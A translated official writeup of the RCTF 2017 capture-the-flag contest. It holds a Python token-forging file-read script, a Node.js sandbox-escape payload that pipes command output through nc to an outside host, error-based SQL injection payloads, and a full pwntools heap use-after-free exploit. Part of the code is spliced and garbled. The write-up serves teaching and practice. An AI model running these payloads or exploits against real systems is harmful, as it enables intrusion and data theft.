# 【CTF 攻略】RCTF 2017 官方Writeup
##### 译文声明
本文是翻译文章，文章来源：xctf.org.cn
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
**传送门**
[**RCTF
2017上演安全极客的速度与激情，国际黑马战队motesolo积分榜排名第一！**](http://bobao.360.cn/news/detail/4173.html)
**  
**
**WEB**
**rBlog (13 solved)**
Category:WEB
曾经在一篇 writeup 发布后的第二天我修正了一处 typo ，但后来还是有朋友发截图来指出 typo ，我看了下 Feedly
上的订阅居然还是旧的内容。Google 搜索了一番我发现了[
**这个结果**](https://groups.google.com/forum/#!topic/feedly-cloud/3evZeYOnS2I)：
所以就有了这题 rBlog ……
从给出的源码中不难看出博客有 RSS 源，访问 /feed 会返回 static/atom.xml 的内容。 在添加文章时，传入的 markdown
格式的文本会被渲染成 HTML ，以文章的 id 作为文件名，被保存到 templates/posts/ 文件夹下，并且重新生成
atom.xml；在删除文章时，对应的 HTML 也会被删除，并且重新生成 atom.xml。
结合提示“There was a post on the blog containing the flag you want, but it has
been deleted before the CTF starts.”可以知道 flag 是不可能在博客上被找到的。（我本应该在题目描述中说明 flag
位置的，而不是在提示里x_x）但如果它在删除前被第三方服务缓存了呢？著名的 archive.org 需要主动请求——并不大可能；Google
快照可能是一个方式，但在线 RSS 订阅服务对于个人博客来说或许是最好的缓存。
在许多在线 RSS 订阅服务中，我选择了比较流行的的 Feedly。在 Feedly 中输入博客的 RSS 源地址，就可以得到 flag 了：
**rFile (6 solved)**
Category:WEB
rFile 是一个“反盗链”文件存储服务。通过分析 index.js 可知页面每 30 秒会请求 /api/download 来更新文件列表，api
返回的内容包括文件大小、文件名、修改时间，以及一个 token。下载文件时，会请求 /api/download/{token}/{filename}
。通过观察可以知道，每个文件每一分钟都会有一个不同的 token。
让我们试着将 sample.cpp 的下载请求中的文件名修改成一个存在的文件—— sample.c，会得到 “token
expired”的提示。这说明服务端是根据 {filename} 来提供文件，并且 {filename} 很有可能参与了 {token} 的生成。由于
token 是每一分钟更新一次，我们猜测时间戳也参与了 token 的生成。通过 fuzz 可以得出 token = md5(timestamp +
filename) 。
知道了 token 的生成方式，我们可以尝试通过读取文件，获得服务端的源代码。根据服务器发送的 HTTP 头中的
Server:gunicorn/19.7.1 ，我们猜测 rFile 有很大可能是 Python Web 应用。（后来也给出了 Hint 说明是
flask）
尝试读取当前目录中不存在的文件，会得到 “unknown error” ；尝试读取 ../__init__.py ，得到 “filetype not
allowed”。如果你熟悉 Python Web 应用（尤其是 Python3），你一定会知道 __pycache__/ 这个目录。当前文件夹的 .py
文件生成的 .pyc 都会被存在这个目录中，并且以 .cpython-35.pyc 为扩展名（其中的 35 与 CPython 版本有关）。
我的 exp.py (Python3):
    from hashlib import md5
    from time import time
    from json import dumps, loads
    from urllib.parse import quote, unquote
    import requests
    url = 'http://rfile.2017.teamrois.cn/'
    ts = int(time()) - 50
    buf = -1
    while buf { this.constructor.constructor('return process')().mainModule.require('child_process').execSync('ls . | nc xxx 3002') })(), {"
    Login
    Category:WEB Score:714
    注册账号登录之后看到第一个提示，很明显这一道注入题。
    No bruteforcing and scanning!
    Flag is in database.
    Flag is like RCTF{...}
看 HTML 源码发现前台有正则过滤，就用 BurpSuite 抓包直接测试。
很明显，注入点在 login 的 username。而且给了 报错信息。
盲测可以发现有只有一个36位的长度限制，其他输入内容都不过滤。所以我们的 payload 要小于 36 位就可以了。
既然有给报错信息，首先报错注入。使用 GTID_SUBSET() 函数查看 password 的信息。
    payload: '+GTID_SUBSET(password,1)#
    msg: Malformed GTID set specification 'HINT:flag_is_in_this_table_and_its_columns_is_QthD2GLz_but_not_the_first_record.'.
看下 QthD2GLz 字段的信息。
    payload: '+GTID_SUBSET(QthD2GLz,1)#
    msg: Malformed GTID set specification 'RCTF{this_is_error_flag}'.
既然不是第一条记录，那么就加个限制条件进行报错注入。从 id=1 开始报错，在 id=17 的时候得到结果。
    payload: '+GTID_SUBSET(QthD2GLz,1)&&id=17#
    msg: Malformed GTID set specification 'RCTF{S1mpl3_M_Err0r_Ba3eD_I}'.
得到flag: RCTF{S1mpl3_M_Err0r_Ba3eD_I}
**PWN**
**aiRcraft**
Category:PWN Score:606 典型的fastbin UAF，堆上预留了函数指针，利用fastbin attack 修改堆上的函数指针即可
    from pwn import *
    context.log_level = 'debug'
    def NewPlane(p, company, name):
        p.recvuntil('Your choice: ')
        p.send('1n')
        p.recvuntil('whcih company? n')
        p.send(str(company) + 'n')
        p.recvuntil("Input the plane's name: ")
        p.send(name)
    def SelectPlane(p, name):
        p.recvuntil('Your choice: ')
        p.send('4n')
        p.recvuntil('Which plane do you want to choose? ')
        p.send(name)
    def Fly(p, airport):
        p.recvuntil('Your choice: ')
        p.send('1n')
        p.recvuntil('which airport do you want to fly? ')
        p.send(str(airport) + 'n')
    def SellPlane(p):
        p.recvuntil('Your choice: ')
        p.send('2n')
    def NewAirport(p, length, name):
        p.recvuntil('Your choice: ')
        p.send('2n')
        p.recvuntil("How long is the airport's name? ")
        p.send(str(length) + 'n')
        p.recvuntil('Please input the name: ')
        p.send(name)
    def EnterAirport(p, idx):
        p.recvuntil('Your choice: ')
        p.send('3n')
        p.recvuntil('choose? ')
        p.send(str(idx) + 'n')
    def ListPlane(p):
        p.recvuntil('Your choice: ')
        p.send('1n')
    def SellAirport(p):
        p.recvuntil('Your choice: ')
        p.send('2n')
    def Exit(p):
        p.recvuntil('Your choice: ')
        p.send('3n')
    p = process('./aiRcraft')
    NewPlane(p, 1, 'A' * 0x20)
    NewPlane(p, 2, 'B' * 0x20)
    NewAirport(p, 0x10, 'a' * 0x10)
    SelectPlane(p, 'A' * 0x1f + 'x00')
    Fly(p, 0)
    Exit(p)
    SelectPlane(p, 'B' * 0x1f + 'x00')
    Fly(p, 0)
    Exit(p)
    SelectPlane(p, 'B' * 0x1f + 'x00')
    SellPlane(p)
    SelectPlane(p, 'A' * 0x1f + 'x00')
    SellPlane(p)
    EnterAirport(p, 0)
    ListPlane(p)
    p.recvuntil('Plane name: ')
    heap_base = u64(p.recvn(6).ljust(8, 'x00')) - 0x50
    log.info("heap base: " + hex(heap_base))
    Exit(p)
    payload = ''
    payload += 'A' * 0x1f + 'x00'
    payload += p64(heap_base + 0xa0)
    payload += p64(heap_base + 0xb0)
    NewAirport(p, 0x40, payload + 'n')
    EnterAirport(p, 0)
    ListPlane(p)
    p.recvuntil('Build by ')
    binary_base = u64(p.recvn(6).ljust(8, 'x00')) - 0xb7d
    log.info("binary base " + hex(binary_base))
    Exit(p)
    payload = ''
    payload += 'A' * 0x1f + 'x00'
    payload += p64(binary_base + 0x201fb8)
    payload += p64(heap_base + 0xb0)
    NewAirport(p, 0x40, payload + 'n')
    EnterAirport(p, 0)
    ListPlane(p)
    p.recvuntil('Plane name:')
    p.recvuntil('Plane name:')
    p.recvuntil('Build by ')
    libc_base = u64(p.recvn(6).ljust(8, 'x00')) - 0x201c0
    log.info("libc base " + hex(libc_base))
    Exit(p)
    NewPlane(p, 1, '/bin/sh'.ljust(0x10, 'x00') + p64(0x00) + p64(0x51))
    NewPlane(p, 1, 'D' * 0x10 + p64(0x00) + p64(0x51))
    NewPlane(p, 1, 'DOUBLEFREE1n')
    NewPlane(p, 1, 'DOUBLEFREE2n')
    NewAirport(p, 0x10, 'DOUBLEn')
    SelectPlane(p, 'DOUBLEFREE1n')
    Fly(p, 3)
    SellPlane(p)
    SelectPlane(p, 'DOUBLEFREE2n')
    SellPlane(p)
    EnterAirport(p, 3)
    SellAirport(p)